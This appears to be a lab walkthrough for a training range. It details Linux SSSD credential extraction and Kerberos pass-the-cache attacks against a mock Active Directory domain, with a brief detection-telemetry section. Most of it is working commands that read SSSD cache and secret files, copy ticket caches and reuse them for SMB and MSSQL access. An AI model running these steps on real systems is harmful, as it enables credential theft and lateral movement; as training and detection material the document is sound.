# WT#045 — Linux SSSD Ticket Extraction

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.40 (linux01) |
| **Domain** | cadre.local |
| **Starting Credential** | Post-compromise (local or domain user on linux01) |
| **Tools Required** | cat, strings, tshark (optional) |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1555, T1558 |
| **Difficulty** | Medium |

## Prerequisites
- Shell access on linux01
- `sssd` service running and integrated with cadre.local

## Attack Steps

### 1. Locate SSSD artifacts
```bash
ls -la /var/lib/sss/db/
ls -la /var/lib/sss/secrets/
ls -la /tmp/krb5cc_*
```

### 2. Extract cached credentials from SSSD database
```bash
sudo cat /var/lib/sss/db/cache_cadre.local.ldb | strings | grep -i password
```

### 3. Extract Kerberos tickets
```bash
# List cached Kerberos tickets
sudo ls -la /tmp/krb5cc_*

# Export ticket
sudo klist -c /tmp/krb5cc_<UID>
sudo cp /tmp/krb5cc_<UID> /tmp/stolen.ccache

# Use stolen ticket
export KRB5CCNAME=/tmp/stolen.ccache
klist
```

### 4. Extract SSSD secrets (keytab/sensitive data)
```bash
sudo cat /var/lib/sss/secrets/*.ldb | strings
```

### 5. Pass-the-cache to authenticate to services
```bash
export KRB5CCNAME=/tmp/stolen.ccache
smbclient -k //dc01.cadre.local/c$
```
Or for MSSQL:
```bash
export KRB5CCNAME=/tmp/stolen.ccache
impacket-mssqlclient -k cadre.local/sql_user@linux01
```

## Post-Exploitation Chain
SSSD ticket extraction → Kerberos ticket reuse → Lateral movement to AD services (SMB, MSSQL, etc.)

## Telemetry Verification
- **auditd key `sssd_db`**: Access to `/var/lib/sss/db/cache_cadre.local.ldb`
- **auditd key `session_ticket`**: Kerberos ticket usage anomalies
- **Event 4768 / 4769 (dc01)**: Kerberos TGS requests using extracted tickets

## Status
CONFIGURED
